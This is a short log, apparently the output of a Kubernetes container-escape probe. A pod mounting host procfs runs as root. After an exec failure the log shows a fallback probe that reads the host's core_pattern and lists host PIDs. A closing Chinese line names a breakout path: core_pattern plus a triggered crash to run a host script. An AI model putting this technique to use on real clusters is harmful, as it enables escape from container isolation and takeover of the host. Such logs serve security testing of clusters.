===== mount-host-procfs =====
UTC 2026-03-10 14:21:54
pod/mount-host-procfs created
pod/mount-host-procfs condition met
error: Internal error occurred: error executing command in container: failed to exec in container: failed to start exec "a6bc4610207b33744c08bffc158423b11f695e5c6a85e14bdf8d2cea8165b198": OCI runtime exec failed: exec failed: unable to start container process: error adding pid 3880 to cgroups: failed to write 3880: openat2 /sys/fs/cgroup/unified/kubelet.slice/kubelet-kubepods.slice/kubelet-kubepods-besteffort.slice/kubelet-kubepods-besteffort-pod6d796543_99ab_449d_a85d_60089e3c27a2.slice/cri-containerd-01eba63e657b9f4735634c2182b2a007438bcb81f201451c82e25b32efc7f401.scope/cgroup.procs: no such file or directory: unknown
[*] Exec probe failed, attempting startup-log fallback...
K8S_LOG_PROBE_BEGIN
uid=0(root) gid=0(root) groups=0(root)
|/usr/lib/systemd/systemd-coredump %P %u %g %s %t %c %h %d
1
1319
1337
1375
1383
1443
1641
1832
1874
1878
K8S_LOG_PROBE_OK
[*] Verdict: PROBE_LOG_FALLBACK_OK
[*] 完整逃逸可结合 core_pattern + 崩溃触发执行宿主机路径脚本。
[result] exit_code=0
